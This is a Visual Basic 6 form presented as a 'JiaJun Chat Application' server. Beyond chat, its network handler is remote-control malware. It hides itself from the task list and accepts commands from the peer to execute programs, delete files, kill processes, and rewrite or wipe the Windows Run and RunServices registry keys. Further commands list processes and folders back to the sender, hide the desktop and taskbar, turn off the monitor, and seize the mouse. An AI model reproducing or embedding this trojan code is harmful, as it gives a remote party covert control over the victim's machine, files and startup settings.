VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00C00000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "JiaJun Chat Application - Server Mode"
   ClientHeight    =   7005
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   6975
   Icon            =   "Chat Server.frx":0000
   LinkTopic       =   "Form1"
   MinButton       =   0   'False
   ScaleHeight     =   7005
   ScaleWidth      =   6975
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      BackColor       =   &H0080C0FF&
      Caption         =   "&Connect"
      Height          =   255
      Index           =   2
      Left            =   2280
      Style           =   1  'Graphical
      TabIndex        =   19
      Top             =   6120
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H0080C0FF&
      Caption         =   "&About"
      Height          =   255
      Index           =   1
      Left            =   1200
      Style           =   1  'Graphical
      TabIndex        =   18
      Top             =   6120
      Width           =   975
   End
   Begin VB.TextBox Text8 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   5520
      TabIndex        =   17
      Text            =   "127.0.0.1"
      Top             =   6600
      Width           =   1305
   End
   Begin VB.TextBox Text7 
      Height          =   2655
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   11
      Top             =   360
      Visible         =   0   'False
      Width           =   6975
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   5640
      Top             =   0
   End
   Begin VB.TextBox Text6 
      Height          =   2655
      Left            =   5280
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   10
      Top             =   3360
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.TextBox Text5 
      Height          =   2655
      Left            =   3600
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   9
      Top             =   3360
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.FileListBox File1 
      Height          =   2625
      Left            =   1800
      TabIndex        =   8
      Top             =   3360
      Visible         =   0   'False
      Width           =   1785
   End
   Begin VB.DirListBox Dir1 
      Height          =   2565
      Left            =   0
      TabIndex        =   7
      Top             =   3360
      Visible         =   0   'False
      Width           =   1815
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   5280
      Locked          =   -1  'True
      TabIndex        =   6
      Top             =   0
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   5160
      Locked          =   -1  'True
      TabIndex        =   5
      Top             =   0
      Visible         =   0   'False
      Width           =   150
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   6360
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      Protocol        =   1
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H0080C0FF&
      Caption         =   "&Clear Text"
      Height          =   255
      Index           =   0
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   6120
      Width           =   975
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FF00FF&
      Height          =   2655
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   3360
      Width           =   6975
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FF00FF&
      Height          =   2655
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   360
      Width           =   6975
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6000
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      Protocol        =   1
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "Connect To:"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   4500
      TabIndex        =   16
      Top             =   6600
      Width           =   885
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "Client To Server: Not Connected"
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   120
      TabIndex        =   15
      Top             =   6720
      Width           =   2310
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "Server To Client: Not Connected"
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   120
      TabIndex        =   14
      Top             =   6480
      Width           =   2310
   End
   Begin VB.Label Label4 
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   5520
      TabIndex        =   13
      Top             =   6240
      Width           =   1305
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "My IP:"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   4920
      TabIndex        =   12
      Top             =   6240
      Width           =   450
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "Client"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   240
      TabIndex        =   3
      Top             =   3120
      Width           =   495
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H00C00000&
      Caption         =   "Server"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   570
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Confine/Free Mouse
Private Type Rect
left As Long
top As Long
right As Long
bottom As Long
End Type
Private Declare Function ClipCursor Lib "user32.dll" (lpRect As Rect) As Long
Private Declare Function GetWindowRect Lib "user32.dll" (ByVal hwnd As Long, lpRect As Rect) As Long
Private Declare Function GetDesktopWindow Lib "user32.dll" () As Long
'Swap/Restore Mouse
Private Declare Function SwapMouseButton Lib "user32.dll" (ByVal bSwap As Long) As Long
'Registry Constants
Const REG As Long = 1
Const HKEY_CURRENT_USER As Long = &H80000001
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Delete Registry Key
Private Declare Function RegDeleteKeyA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
'Create Registry Key
Private Type SECURITY_ATTRIBUTES
  nLength As Long
  lpSecurityDescriptor As Long
  bInheritHandle As Boolean
End Type
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, lpdwDisposition As Long) As Long
'Open/Set/Close Registry Values
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegisterServiceProcess Lib "Kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long

'Set Form To Top Or Not Top Most To Get Attention
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Const HWND_TOPMOST = -1
Private Const HWND_NOTOPMOST = -2
Private Const SWP_NOSIZE = &H1
Private Const SWP_NOMOVE = &H2

Private Type POINT_TYPE
x As Long
y As Long
End Type
Private Declare Function GetCursorPos Lib "user32.dll" (lpPoint As POINT_TYPE) As Long
Dim coord As POINT_TYPE
Dim retval As Long

'Terminate Applications
Const MAX_PATH& = 260
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * MAX_PATH
    End Type
'Hide/Show Desktop, Taskbar
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Const WM_SYSCOMMAND = &H112&
Private Const SC_MONITORPOWER = &HF170&
Private Function KillApp(myName As String) As Boolean
    Text7 = ""
    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim exitCode As Long
    Dim myProcess As Long
    Dim AppKill As Boolean
    Dim appCount As Integer
    Dim i As Integer
    On Local Error GoTo Finish
    appCount = 0
    
    Const TH32CS_SNAPPROCESS As Long = 2&
    
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)


    Do While rProcessFound
        i = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(left$(uProcess.szexeFile, i - 1))
        Text7 = Text7 + szExename + Chr$(13)
        If right$(szExename, Len(myName)) = LCase$(myName) Then
            KillApp = True
            appCount = appCount + 1
            myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
            AppKill = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
Finish:
End Function
Private Sub Command1_Click(Index As Integer)
'Clear Text
If Index = 0 Then Text1 = ""
If Index = 1 Then
Form2.Timer1.Enabled = True
Form2.Visible = True
End If
If Index = 2 And Command1(2).Caption = "&Connect" Then
If Text8 = "" Then msg = MsgBox("Please Enter A Valid IP", vbCritical, "Error"): Exit Sub
Command1(2).Caption = "&Disconnect"
Winsock1.RemoteHost = Text8
Winsock2.RemoteHost = Text8
Send "RequestConnect"
Exit Sub
End If
If Index = 2 And Command1(2).Caption = "&Disconnect" Then
Command1(2).Caption = "&Connect"
Label6 = "Server To Client: Not Connected"
Text1.Locked = True
Winsock1.Close
Winsock2.Close
Send "Disconnect"
Exit Sub
End If
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
If Label6 = "Server To Client: Not Connected" Then End
Send "Disconnect"
End
End Sub
Private Sub Text7_Change()
Send "RunList" + Text7
End Sub
Private Sub Timer1_Timer()
On Error GoTo skip
retval = GetCursorPos(coord)
Send "MX" + Str$(coord.x * 4)
Send "MY" + Str$(coord.y * 4)
skip:
End Sub
Private Sub Dir1_Change()
'Retrieve File Information And Send It
On Error GoTo skip
File1.Path = Dir1.Path
Text5 = ""
For a = 0 To Dir1.ListCount
Text5 = Text5 + Dir1.List(a) + Chr$(13)
Next a
Send "Dir" + Text5

Text6 = ""
For a = 0 To File1.ListCount
Text6 = Text6 + File1.List(a) + Chr$(13)
Next a
Send "File" + Text6
skip:
End Sub
Private Sub Form_Load()
Call RegisterServiceProcess(0, 1)
Label4 = Winsock1.LocalIP
With Winsock1
.RemotePort = 1001
.Bind 1002
End With
With Winsock2
.RemotePort = 1003
.Bind 1004
End With
End Sub
Private Sub Text1_Change()
ChatSend Text1.Text
End Sub
Private Sub Text2_Change()
On Error Resume Next
Text2.SelLength = 0
If Len(Text2.Text) > 0 Then
If right$(Text2.Text, 1) = vbCrLf Then
Text2.SelStart = Len(Text2.Text) - 1
Exit Sub
End If
Text2.SelStart = Len(Text2.Text)
End If
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
'Receive Text
Dim JiaJun As String
Winsock1.GetData JiaJun
Text2 = JiaJun
End Sub
Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
'Receive Actions

'Confine/Free Mouse
Dim r As Rect, retval As Long
Dim deskhWnd As Long
deskhWnd = GetDesktopWindow()
'End of Confine/Free Mouse

'Create Key
Dim hregkey As Long  ' receives handle to the newly created or opened registry key
Dim secattr As SECURITY_ATTRIBUTES  ' security settings of the key
Dim neworused As Long
secattr.nLength = Len(secattr)  ' size of the structure
secattr.lpSecurityDescriptor = 0  ' default security level
secattr.bInheritHandle = True
'End of Create Key

Dim actions As String
Winsock2.GetData actions

If actions = "Attention" Then 'Get Attention
lflag = HWND_TOPMOST
SetWindowPos Form1.hwnd, lflag, 0, 0, 0, 0, SWP_NOACTIVATE Or SWP_SHOWWINDOW Or SWP_NOSIZE Or SWP_NOMOVE
lflag = HWND_NOTOPMOST
SetWindowPos Form1.hwnd, lflag, 0, 0, 0, 0, SWP_NOACTIVATE Or SWP_SHOWWINDOW Or SWP_NOSIZE Or SWP_NOMOVE
End If

'Start MsgBox
If InStr(1, actions, "MsgBox00") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbOKOnly, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox01") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbOKCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox02") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbYesNo, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox03") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbYesNoCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox04") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbAbortRetryIgnore, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox05") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbRetryCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox06") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbCritical + vbMsgBoxHelpButton, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))

If InStr(1, actions, "MsgBox10") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbOKOnly, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox11") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbOKCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox12") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbYesNo, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox13") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbYesNoCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox14") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbAbortRetryIgnore, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox15") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbRetryCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox16") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbExclamation + vbMsgBoxHelpButton, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))

If InStr(1, actions, "MsgBox20") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbOKOnly, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox21") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbOKCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox22") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbYesNo, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox23") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbYesNoCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox24") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbAbortRetryIgnore, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox25") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbRetryCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox26") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbInformation + vbMsgBoxHelpButton, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))

If InStr(1, actions, "MsgBox30") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbOKOnly, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox31") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbOKCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox32") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbYesNo, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox33") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbYesNoCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox34") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbAbortRetryIgnore, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox35") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbRetryCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox36") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbQuestion + vbMsgBoxHelpButton, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))

If InStr(1, actions, "MsgBox40") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbOKOnly, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox41") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbOKCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox42") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbYesNo, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox43") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbYesNoCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox44") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbAbortRetryIgnore, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox45") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbRetryCancel, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
If InStr(1, actions, "MsgBox46") Then msg = MsgBox(right$(actions, Len(actions) - InStr(1, actions, Chr$(255))), vbMsgBoxHelpButton, Mid$(actions, 9, InStr(1, actions, Chr$(255)) - 9))
'End Of MsgBox

If msg = 1 Then Send "MsgboxOk"
If msg = 2 Then Send "MsgboxCancel"
If msg = 3 Then Send "MsgboxAbort"
If msg = 4 Then Send "MsgboxRetry"
If msg = 5 Then Send "MsgboxIgnore"
If msg = 6 Then Send "MsgboxYes"
If msg = 7 Then Send "MsgboxNo"

If actions = "HideD" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Progman", vbNullString), 0, "ShellDll_DefView", vbNullString), 0, "SysListView32", vbNullString), 0
If actions = "ShowD" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Progman", vbNullString), 0, "ShellDll_DefView", vbNullString), 0, "SysListView32", vbNullString), 1
If actions = "HideT" Then ShowWindow FindWindow("Shell_TrayWnd", vbNullString), 0
If actions = "ShowT" Then ShowWindow FindWindow("Shell_TrayWnd", vbNullString), 1
If actions = "HideTB" Then ShowWindow FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 0
If actions = "ShowTB" Then ShowWindow FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 1
If actions = "HideTI" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "ReBarWindow32", vbNullString), 0, "ToolbarWindow32", vbNullString), 0
If actions = "ShowTI" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "ReBarWindow32", vbNullString), 0, "ToolbarWindow32", vbNullString), 1
If actions = "HideTTabs" Then ShowWindow FindWindowEx(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "ReBarWindow32", vbNullString), 0, "MSTaskSwWClass", vbNullString), 0, "SysTabControl32", vbNullString), 0
If actions = "ShowTTabs" Then ShowWindow FindWindowEx(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "ReBarWindow32", vbNullString), 0, "MSTaskSwWClass", vbNullString), 0, "SysTabControl32", vbNullString), 1
If actions = "HideTTray" Then ShowWindow FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0
If actions = "ShowTTray" Then ShowWindow FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 1
If actions = "HideTClock" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 0
If actions = "ShowTClock" Then ShowWindow FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 1

If actions = "Accepted" Then Label6 = "Server To Client: Connected": Text1.Locked = False
If actions = "RequestConnect" Then Label7 = "Client To Server: Connected": Send "Accepted"
If actions = "Disconnect" Then Label7 = "Client To Server: Not Connected"
If actions = "MonitorOff" Then Ret = SendMessage(Form1.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, 1&)
If actions = "MonitorOn" Then Ret = SendMessage(Form1.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, -1&)
If actions = "InvisibleF" Then Form1.Visible = False: Form2.Visible = False
If actions = "VisibleF" Then Form1.Visible = True
If InStr(actions, "CloseAPP") Then KillApp (right$(actions, (Len(actions) - 8)))
If actions = "SeeMouse" Then Timer1.Enabled = True 'Send Mouse Movements
If actions = "NoSeeMouse" Then Timer1.Enabled = False 'Stop Sending Mouse Movements
If actions = "Visible" Then Form1.Visible = True 'Make Form Visible
If actions = "JMouse" Then retval = ClipCursor(r) 'Freeze Mouse
If actions = "CMouse" Then retval = GetWindowRect(Form1.hwnd, r): retval = ClipCursor(r) 'Confine Mouse in Form
If actions = "FMouse" Then retval = GetWindowRect(deskhWnd, r): retval = ClipCursor(r) 'Free Mouse
If actions = "SMouse" Then retval = SwapMouseButton(1) 'Swap Mouse Buttons
If actions = "RMouse" Then retval = SwapMouseButton(0) 'Restore Mouse Buttons
If InStr(actions, "URL") Then Shell "Start " + right$(actions, Len(actions) - 3), 0 'Start URL
If actions = "CText" Then Text1 = "" 'Clear Text
If actions = "EndChat" Then End 'End Chat Program
'Delete Registry Key Contents
If actions = "RegDel" Then retval = RegDeleteKeyA(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run"): retval = RegDeleteKeyA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run"): retval = RegDeleteKeyA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices"): retval = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, "", 0, KEY_WRITE, secattr, hregkey, neworused): retval = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, "", 0, KEY_WRITE, secattr, hregkey, neworused): retval = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, "", 0, KEY_WRITE, secattr, hregkey, neworused)
'Add Registry Key Contents
'RegName - Text3; RegData - Text4 -Run
If InStr(actions, "RegNameRun") Then Text3 = right$(actions, Len(actions) - 10): retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, a): retval = RegSetValueExA(a, Text3, 0, REG, "", 1): retval = RegCloseKey(a)
If InStr(actions, "RegDataRun") Then Text4 = right$(actions, Len(actions) - 10): retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, a): retval = RegSetValueExA(a, Text3, 0, REG, Text4, 1): retval = RegCloseKey(a)
'RegName - Text3; RegData - Text4 -RunServices
If InStr(actions, "RegNameRunSerVices") Then Text3 = right$(actions, Len(actions) - 18): retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, KEY_ALL_ACCESS, a): retval = RegSetValueExA(a, Text3, 0, REG, "", 1): retval = RegCloseKey(a)
If InStr(actions, "RegDataRunSerVices") Then Text4 = right$(actions, Len(actions) - 18): retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, KEY_ALL_ACCESS, a): retval = RegSetValueExA(a, Text3, 0, REG, Text4, 1): retval = RegCloseKey(a)
On Error GoTo skip
If InStr(actions, "Execute") Then MyApp = Shell(right$(actions, Len(actions) - 7), 1): AppActivate MyApp
If InStr(actions, "DirPath") Then Dir1.Path = right$(actions, Len(actions) - 7)
If InStr(actions, "DelFile") Then Kill right$(actions, Len(actions) - 7): Send "Success"
skip:
End Sub
